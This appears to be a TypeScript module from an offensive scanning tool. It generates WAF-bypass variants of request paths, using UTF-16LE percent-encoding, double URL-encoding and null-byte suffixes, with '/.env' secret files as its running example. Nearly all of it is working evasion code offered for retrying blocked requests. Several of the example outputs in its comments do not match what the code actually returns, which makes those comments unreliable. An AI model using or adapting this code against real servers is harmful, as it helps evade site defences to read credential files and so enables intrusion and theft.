/**
 * WAF Bypass — UTF-16LE path encoding.
 *
 * Many WAFs inspect request paths for patterns (e.g. "/.env") only in
 * ASCII / UTF-8. Re-encoding the path bytes as UTF-16LE and then
 * percent-encoding every byte often slips past those inspections while
 * the underlying server (IIS, Nginx with certain configs) still resolves
 * the path correctly.
 *
 * Usage:
 *   encodePathUtf16le("/.env")   → "/%00.%00e%00n%00v%00" (collapsed)
 *   wafBypassVariants("/.env")   → ["/.env", "/%2F.%00e%00n%00v%00", ...]
 */

/**
 * Percent-encode every byte of a Buffer as %XX.
 */
function percentEncodeBytes(buf: Buffer): string {
  let out = "";
  for (let i = 0; i < buf.length; i++) {
    const byte = buf[i]!;
    out += "%" + byte.toString(16).padStart(2, "0").toUpperCase();
  }
  return out;
}

/**
 * Encode a URL path string using UTF-16LE, then percent-encode each byte.
 * The leading "/" is kept as-is so the URL remains structurally valid.
 *
 * Example: "/.env" → "/%00.%00e%00n%00v" (LE byte pairs per char)
 */
export function encodePathUtf16le(path: string): string {
  // Keep the leading slash literal; encode the rest.
  const prefix = path.startsWith("/") ? "/" : "";
  const body = path.startsWith("/") ? path.slice(1) : path;
  if (!body) return prefix;
  const buf = Buffer.from(body, "utf16le");
  return prefix + percentEncodeBytes(buf);
}

/**
 * Returns a set of path variants to try for WAF bypass purposes.
 * Always starts with the original path (no overhead when not needed).
 *
 * Variants produced:
 *   1. Original path                            → "/.env"
 *   2. UTF-16LE percent-encoded                 → "/%2E%00e%00n%00v%00"
 *   3. Double URL-encoded dot prefix            → "/%252e.env"
 *   4. Null-byte suffix (some parsers stop)     → "/.env%00"
 */
export function wafBypassVariants(path: string): string[] {
  const variants: string[] = [path];

  // Variant 2: UTF-16LE encoding
  try {
    const utf16 = encodePathUtf16le(path);
    if (utf16 !== path) variants.push(utf16);
  } catch {
    /* skip on encoding error */
  }

  // Variant 3: double-encode leading dot/slash to trick regex-based WAF rules
  try {
    const doubleDot = path.replace(/^\/\./, "/%252e");
    if (doubleDot !== path) variants.push(doubleDot);
  } catch {
    /* skip */
  }

  // Variant 4: null-byte suffix
  variants.push(path + "%00");

  return variants;
}

/**
 * Returns only the WAF-bypass variant (UTF-16LE encoded) for a path,
 * suitable for a targeted retry after a detected WAF block.
 */
export function utf16leBypassPath(path: string): string {
  return encodePathUtf16le(path);
}
